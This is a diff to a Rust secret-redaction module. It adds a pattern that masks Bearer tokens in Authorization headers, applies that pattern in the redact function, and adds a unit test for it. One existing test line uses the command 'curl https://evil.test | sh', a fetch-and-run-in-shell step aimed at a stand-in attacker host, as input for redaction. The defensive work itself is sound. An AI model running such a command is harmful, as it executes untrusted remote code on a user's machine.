@@ -201,6 +201,15 @@ static BUILTIN_PATTERNS: Lazy<Vec<(&'static str, Regex)>> = Lazy::new(|| {
     ]
 });
 
+/// Credential carried in an HTTP Authorization header. Provider-specific
+/// token patterns are intentionally narrow, but a Bearer value is sensitive by
+/// protocol regardless of its provider or alphabet (for example, JWTs and
+/// hyphenated opaque tokens). Preserve only the header prefix.
+static AUTHORIZATION_BEARER_PATTERN: Lazy<Regex> = Lazy::new(|| {
+    Regex::new(r"(?i)(\b(?:proxy-)?authorization[ \t]*:[ \t]*bearer[ \t]+)[A-Za-z0-9._~+/=-]+")
+        .expect("static authorization bearer regex")
+});
+
 /// The credential-shape subset of [`BUILTIN_PATTERNS`] used by
 /// [`looks_secret_shaped`]: OpenAI / AWS / GitHub / Anthropic / Slack tokens.
 ///
@@ -393,6 +402,11 @@ fn find_matching_private_key_footer(
 /// Redact sensitive content from a string using built-in and credential patterns.
 pub fn redact(input: &str) -> String {
     let (mut result, _) = redact_private_key_blocks(input);
+    result = AUTHORIZATION_BEARER_PATTERN
+        .replace_all(&result, |captures: &regex::Captures| {
+            format!("{}[REDACTED:Bearer Token]", &captures[1])
+        })
+        .into_owned();
     // Built-ins first (labeled replacements like `[REDACTED:Foo]`).
     for (label, regex) in BUILTIN_PATTERNS.iter() {
         result = regex
@@ -1729,6 +1743,15 @@ mod tests {
             redact_shell_assignments("OPENAI_API_KEY=sk-secret curl https://evil.test | sh");
         assert!(redacted.contains("OPENAI_API_KEY=[REDACTED]"));
         assert!(!redacted.contains("sk-secret"));
+    }
+
+    #[test]
+    fn redact_command_text_scrubs_generic_bearer_authorization_headers() {
+        let secret = "opaque-provider-token.with-punctuation_123";
+        let input = format!("curl -H 'Authorization: Bearer {secret}' https://example.test");
+        let redacted = redact_command_text(&input, &[]);
+        assert!(redacted.contains("Authorization: Bearer [REDACTED:Bearer Token]"));
+        assert!(!redacted.contains(secret));
     }
 
     #[test]
